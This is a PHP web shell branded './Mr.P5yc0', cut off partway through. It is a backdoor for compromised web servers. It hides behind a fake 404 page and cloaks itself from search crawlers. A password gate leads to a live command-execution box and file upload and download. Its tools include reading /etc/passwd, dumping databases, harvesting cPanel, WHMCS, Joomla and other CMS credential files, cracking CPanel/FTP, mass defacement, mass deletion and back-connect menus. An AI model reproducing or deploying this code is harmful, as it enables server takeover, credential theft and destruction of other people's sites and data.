<?php
$auth_pass = "b1daafa69de454f40fdf7a29b6efd19c";
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
@session_start();
@error_reporting(0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
@define('VERSION', '2.1');
function login_shell() {
?>
<title>404 Not Found</title>
<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found error was uncountable while trying to use an ErrorDocument to handle the request.</p>
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style><?php
if(isset($_REQUEST['cmd'])){
		switch ($_REQUEST['cmd']){ case "psyco/shell":?>
    <center> 
    <form method="post"> 
    <input type="password" name="pass"> 
    </form></center>
    <?php break ;}}
    exit; 
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>..::[ ./Mr.P5yc0 ]::..</title>
<link href='http://img11.deviantart.net/3bda/i/2015/196/a/8/slipknot_logo_design_by_alberth_kill2590-d91h8bd.png' rel='icon' type='image/x-icon'/>
<meta name='author' content='./Mr.P5yc0'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: aqua; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
option:hover {
	background: aqua;
	color: #000000;
}
</style>
</head>
<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=aqua>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=aqua>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
function bing($dork) {
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
	    if($x) {
			preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
			foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
			$npage = $npage + 10;
			if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
		} else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
 	$sss = count(array_unique($array));
	foreach($array as $domain) {
		echo $domain."\n";
	}
}
function reverse($url) {
	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
		  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
		  curl_setopt($ch, CURLOPT_HEADER, 0);
		  curl_setopt($ch, CURLOPT_POST, 1);
	$resp = curl_exec($ch);
	$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
	$array = explode(",,", $resp);
	unset($array[0]);
	foreach($array as $lnk) {
		$lnk = "http://$lnk";
		$lnk = str_replace(",", "", $lnk);
		echo $lnk."\n";
		ob_flush();
		flush();
	}
		curl_close($ch);
}
if(get_magic_quotes_gpc()) {
	function psycosocialx($array) {
		return is_array($array) ? array_map('psycosocialx', $array) : stripslashes($array);
	}
	$_POST = psycosocialx($_POST);
	$_COOKIE = psycosocialx($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=aqua>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=aqua>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "System: <font color=lime>".$kernel."</font><br>";
echo "User: <font color=aqua>".$user."</font> (".$uid.") Group: <font color=aqua>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=aqua>".$ip."</font> | Your IP: <font color=aqua>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=aqua>$used</font> / <font color=lime>$total</font> ( Free: <font color=aqua>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo"Config File: "; if(is_readable("/etc/named.conf")){

echo '[<font color=aqua>/etc/named.conf</font>] ';

}else{

echo '[<font color=red>/etc/named.conf</font>] ';

}

if(is_readable("/etc/passwd")){

echo '[<font color=aqua>/etc/passwd</font>] ';

}else{

echo '[<font color=red>/etc/passwd</font>] ';

}

if(is_readable("/etc/valiases")){

echo '[<font color=aqua>/etc/valiases</font>] ';

}else{

echo '[<font color=red>/etc/valiases</font>] ';

}

if(is_readable("/var/named")){

echo '[<font color=aqua>/var/named</font>] ';

}else{

echo '[<font color=red>/var/named</font>] ';

}
echo "<br>Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]<br>";
	echo "<center></fieldset>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=blue>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=blue>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
echo "</fieldset></center><br>";
echo "<center>";
echo "<ul>";
echo "<li> <a style='color: lime;' href='?'>HOME</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=config'>CONFIG</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=symconfig'>CONFIG 2</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=symlink'>SYMLINK</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=jumping'>JUMPING</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=root'>CECK LOCALROOT</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=smtp'>SMTP</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=zoneh'>ZONE-H</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=cgi'>CGI</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=network'>BACK CONNECT</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=adminer'>ADMINER</a> </li><br>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=passwbypass'>BYPASS /etc/passwd</a> </li><br>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=auto_edit_user'>CHANGE USER</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=auto_cu_joomla'>JOOMLA USER CHANGE</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=auto_cu_wp'>WP USER CHANGE</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=mass_deface'>MASS DEFACE</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=auto_wp'>WP TITLE</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=auto_dwp'>WP DEFACE I</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=auto_dwp2'>WP DEFACE II</a> </li><br>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=cpanel'>CPFTP CRACK</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=cpftp_auto'>CPFTP DEFACE</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=krdp_shell'>RDP CREATOR</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=erdipi'>RDP 2</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=dbdump'>DB DUMP</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=hash'>HASH</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=endec'>ENCODE/DECODE</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=port'>OPEN PORT</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=whmcs'>WHMCS DECODER</a> </li>";
echo "<li> <a style='color: lime;' href='?dir=$dir&do=mass_delete'>MASS DELETE</a> </li>";
echo "<li> <a style='color: red;' href='?kill=self'>KILLSELF</a> </li>";
echo "</ul>";
echo "</center>";
echo "<br><fieldset>";
	echo "<form method='post'>
<font style='text-decoration: underline;'>Command : </font>
<input type='text' size='30' height='10' name='cmd'><input type='submit' name='psy' value='>>'>
	</form>	";
	if(isset($_POST['psy']))
{
 
echo'<br><div style="background:#6d6d6d;margin:0px;padding:1px;text-align:left;color:lime;"><pre>';
$cmd = $_POST['cmd'];
if($cmd == "")
{
 
echo "Please Insert Command!";
 }
 
elseif(isset($cmd))
 {
 $output = exe($cmd);
 echo $output; }
echo'</pre></div><br><br>';
}
echo "</fieldset><br>";
if($_GET['do'] == 'hash'){
    $submit = $_POST['enter'];
    if (isset($_POST['password'])) {
        $pass = $_POST['password']; // password
        $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
        $hash = md5($pass); // md5 hash #1
        $md4 = hash("md4", $pass);
        $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
        $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
        $hash1 = sha1($pass); // sha1 hash #4
        $sha256 = hash("sha256", $text);
        $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
        $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6

    }
    echo '<center><br><form action="" method="post"><table>';
    echo '<tr><td>Masukin kata yg mw di encrypt:</td>';
    echo '<td><input class="inputz" type="text" name="password" size="40" />';
    echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
    echo '</td></tr><br>';
    echo '<tr><th colspan="2">Hash Result</th></center></tr>';
    echo '<tr><td>Original Password</td><td><input class=inputz type=text size=50 value=' . $pass . ' ></td></tr>';
    echo '<tr><td>MD5</td><td><input class=inputz type=text size=50 value=' . $hash . ' ></td></tr>';
    echo '<tr><td>MD4</td><td><input class=inputz type=text size=50 value=' . $md4 . ' ></td></tr>';
    echo '<tr><td>MD5 with Salt</td><td><input class=inputz type=text size=50 value=' . $hash_md5 . ' ></td></tr>';
    echo '<tr><td>MD5 with Salt & Sha1</td><td><input class=inputz type=text size=50 value=' . $hash_md5_double . ' ></td></tr>';
    echo '<tr><td>Sha1</td><td><input class=inputz type=text size=50 value=' . $hash1 . '  ></td></tr>';
    echo '<tr><td>Sha256</td><td><input class=inputz type=text size=50 value=' . $sha256 . ' ></td></tr>';
    echo '<tr><td>Sha1 with Salt</td><td><input class=inputz type=text size=50 value=' . $hash1_sha1 . ' ></td></tr>';
    echo '<tr><td>Sha1 with Salt & MD5</td><td><input class=inputz type=text size=50 value=' . $hash1_sha1_double . ' ></td></tr></table></form></center><br>';
		}
elseif($_GET['do'] == 'passwbypass') {
	echo '<br><center>Bypass /etc/passwd With :<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="mix"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';

if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['mix'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
//

//
}
elseif($_GET['do'] == 'endec') {
$text = $_POST['code'];
echo "<center>
<form method='post'><br>
<textarea placeholder='MASUKIN TEXT YANG MAU DI ENCRYPT/DECRYPT' class='inputz' cols=80 rows=10 name='code'></textarea><br><br>
<select class='inputz' size='1' name='ope'>
<option value='urlencode'>url</option>
<option value='json'>json</option>
<option value='ur'>convert_uu</option>
<option value='base64'>Base64</option>
<option value='url'>base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
<option value='base6416x'>Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64</option>
<option value='coeg'>gzinflate - base64</option>
<option value='gzinflater'>gzinflate - str_rot13 - base64</option>
<option value='gzinflatex'>gzinflate - str_rot13 - gzinflate - base64</option>
<option value='str2'>str_rot13 - base64</option>
<option value='gzinflate'>str_rot13 - gzinflate - base64</option>
<option value='str'>str_rot13 - gzinflate - str_rot13 - base64</option>
<option value='super'>str_rot13 - gzinflate - str_rot13 - base64 - gzinflate - str_rot13 -  base64</option>
<option value='gzpress'>gzcompress - base64</option>
</select><br>&nbsp;<input class='inputzbut' type='submit' name='submit' value='Encrypt'>
<input class='inputzbut' type='submit' name='submits' value='Decrypt'>
</form>";
$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_encode($text);
break;case 'str' : $codi=base64_encode(str_rot13(gzdeflate(str_rot13($text))));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;case 'coeg' : $codi=base64_encode(gzdeflate($text));
break;case 'base6416x' : $codi=base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode($text))))))))))))))));
break;case 'super' : $codi=base64_encode(str_rot13(gzdeflate(base64_encode(str_rot13(gzdeflate(str_rot13($text)))))));
break;case 'urlencode' : $codi=rawurlencode($text);
break;case 'ur' : $codi=convert_uuencode($text);
break;case 'json' : $codi=json_encode(utf8_encode($text));
break;case 'str2' : $codi=base64_encode(str_rot13($text));
break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
break;case 'gzpress' : $codi=base64_encode(gzcompress($text));
break;default:break;}}
$submit = $_POST['submits'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;case 'coeg' : $codi=gzinflate(base64_decode($text));
break;case 'base6416x' : $codi=base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(($text)))))))))))))))));
break;case 'super' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(gzinflate(str_rot13(base64_decode($text)))))));
break;case 'urlencode' : $codi=rawurldecode($text);
break;case 'ur' : $codi=convert_uudecode($text);
break;case 'json' : $codi=utf8_decode(json_decode($text));
break;case 'str2' : $codi=str_rot13(base64_decode($text));
break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
break;case 'gzpress' : $codi=gzuncompress(base64_decode($text));
break;default:break;}}
$myfile = fopen("x.txt", "w") or die("Unable to open file!");
fwrite($myfile, $codi);
fclose($myfile);
echo "<center><div id='kotakan'><br>
<a href='x.txt' target='blank_'>[ R E S U L T ]</a></div><br>";
}
elseif ($_GET['do'] == 'dbdump') {
    echo $head . '<center><br><p align="center">';
    echo '<form action method=post>
            <table width=400 class=tabnet >
            <tr>
                <td>Server </td>
                <td><input class="inputz" type=text name=server value="localhost" size=52></td></tr><tr>
                <td>Username</td>
                <td><input class="inputz" type=text name=username size=52></td></tr><tr>
                <td>Password</td>
                <td><input class="inputz" type=text name=password size=52></td></tr><tr>
                <td>DataBase Name</td>
                <td><input class="inputz" type=text name=dbname size=52></td></tr>
                <tr>
                <td>DB Type </td>
                <td><form method=post action="' . $me . '">
                <select class="inputz" name=method>
                    <option  value="gzip">Gzip</option>
                    <option value="sql">Sql</option>
                    </select>
                <input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
                </form></center></table><br>';
        if ($_POST['username'] && $_POST['dbname'] && $_POST['method']) {
            $date = date("Y-m-d");
            $dbserver = $_POST['server'];
            $dbuser = $_POST['username'];
            $dbpass = $_POST['password'];
            $dbname = $_POST['dbname'];
            $file = "Dump-$dbname-$date";
            $method = $_POST['method'];
            if ($method == 'sql') {
                $file = "Dump-$dbname-$date.sql";
                $fp = fopen($file, "w");
            } else {
                $file = "Dump-$dbname-$date.sql.gz";
                $fp = gzopen($file, "w");
            }
                function write($data) {
                    global $fp;
                        if ($_POST['method'] == 'ssql') {
                            fwrite($fp, $data);
                        } else {
                            gzwrite($fp, $data);
                        }
                    }
        mysql_connect($dbserver, $dbuser, $dbpass);
        mysql_select_db($dbname);
        $tables = mysql_query("SHOW TABLES");
            while ($i = mysql_fetch_array($tables)) {
                    $i = $i['Tables_in_' . $dbname];
                    $create = mysql_fetch_array(mysql_query("SHOW CREATE TABLE " . $i));
                    write($create['Create Table'] . ";nn");
                    $sql = mysql_query("SELECT * FROM " . $i);
                       if (mysql_num_rows($sql)) {
                            while ($row = mysql_fetch_row($sql)) {
                                foreach ($row as $j => $k) {
                                    $row[$j] = "'" . mysql_escape_string($k) . "'";
                                }
                            write("INSERT INTO $i VALUES(" . implode(",", $row) . ");n");
                            }
                        }
                    }
                if ($method == 'ssql') {
                    fclose($fp);
                } else {
                    gzclose($fp);
                }
    header("Content-Disposition: attachment; filename=" . $file);
    header("Content-Type: application/download");
    header("Content-Length: " . filesize($file));
    flush();
        $fp = fopen($file, "r");
            while (!feof($fp)) {
                echo fread($fp, 65536);
                flush();
            }
        fclose($fp);
        }
        }
elseif($_GET['do'] == 'config') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("P5yc0_config1", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("P5yc0_config1/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_psy) {
			$user_config_dir = "/home/$user_psy/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
					"/home/$user_psy/.my.cnf" => "cpanel",
					"/home/$user_psy/.accesshash" => "WHM-accesshash",
					"/home/$user_psy/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_psy/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_psy/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_psy/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home/$user_psy/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_psy/public_html/forum/config.php" => "phpBB",
					"/home/$user_psy/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_psy/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_psy/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_psy/public_html/admin/config.php" => "OpenCart",
					"/home/$user_psy/public_html/slconfig.php" => "Sitelok",
					"/home/$user_psy/public_html/application/config/database.php" => "Ellislab",
					"/home/$user_psy/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_psy/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home/$user_psy/public_html/central/configuration.php" => "WHM Central",
					"/home/$user_psy/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home/$user_psy/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home/$user_psy/public_html/submitticket.php" => "WHMCS",
					"/home/$user_psy/public_html/configuration.php" => "Joomla",					
					"/home/$user_psy/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home/$user_psy/public_html/joomla/configuration.php" => "JoomlaJoomla",
